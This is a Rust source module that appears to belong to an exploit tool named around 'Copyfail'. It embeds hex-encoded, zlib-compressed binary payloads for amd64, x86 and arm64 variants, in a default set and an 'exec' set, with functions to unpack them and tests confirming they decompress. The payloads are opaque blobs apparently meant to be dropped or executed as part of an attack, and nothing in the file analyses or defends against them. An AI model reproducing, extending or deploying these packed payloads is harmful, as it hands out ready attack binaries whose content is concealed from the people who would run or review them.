use std::io::Read;

use flate2::read::ZlibDecoder;

use crate::error::{CopyfailError, Result};

const PAYLOADS_ZLIB_HEX: &[(&str, &str)] = &[
    ("amd64", "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3"),
    ("386", "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858"),
    ("arm64", "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578"),
    ("x86_64", "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3"),
    ("x86", "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858"),
    ("aarch64", "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578"),
];

const EXEC_ARGV1_ZLIB_HEX: &[(&str, &str)] = &[
    ("amd64", "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf"),
    ("386", "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180"),
    ("arm64", "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509"),
    ("x86_64", "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf"),
    ("x86", "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180"),
    ("aarch64", "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509"),
];

pub fn default_payload_for_arch(arch: &str) -> Result<Vec<u8>> {
    payload_for_arch(arch, false)
}

pub fn exec_payload_for_arch(arch: &str) -> Result<Vec<u8>> {
    payload_for_arch(arch, true)
}

fn payload_for_arch(arch: &str, exec_mode: bool) -> Result<Vec<u8>> {
    let payload_hex = lookup_payload_hex(arch, exec_mode)
        .ok_or_else(|| CopyfailError::UnsupportedArchitecture(arch.to_string()))?;
    decode_and_decompress(payload_hex)
}

fn lookup_payload_hex(arch: &str, exec_mode: bool) -> Option<&'static str> {
    let payloads = if exec_mode {
        EXEC_ARGV1_ZLIB_HEX
    } else {
        PAYLOADS_ZLIB_HEX
    };

    payloads
        .iter()
        .find_map(|(candidate_arch, payload)| (*candidate_arch == arch).then_some(*payload))
}

fn decode_and_decompress(payload_hex: &str) -> Result<Vec<u8>> {
    let payload_zlib = hex::decode(payload_hex)?;
    let mut decoder = ZlibDecoder::new(payload_zlib.as_slice());
    let mut payload = Vec::new();
    decoder.read_to_end(&mut payload)?;
    Ok(payload)
}

#[cfg(test)]
mod tests {
    use super::{default_payload_for_arch, exec_payload_for_arch};
    use crate::error::CopyfailError;

    #[test]
    fn looks_up_default_payload_for_supported_arch() {
        let payload = default_payload_for_arch("x86_64").unwrap();
        assert!(!payload.is_empty());
    }

    #[test]
    fn looks_up_exec_payload_for_supported_arch() {
        let payload = exec_payload_for_arch("amd64").unwrap();
        assert!(!payload.is_empty());
    }

    #[test]
    fn returns_error_for_unsupported_arch() {
        let err = default_payload_for_arch("mips64").unwrap_err();
        assert!(matches!(err, CopyfailError::UnsupportedArchitecture(ref arch) if arch == "mips64"));
    }

    #[test]
    fn decompresses_payload_to_non_empty_bytes() {
        let payload = default_payload_for_arch("aarch64").unwrap();
        assert!(!payload.is_empty());
    }
}
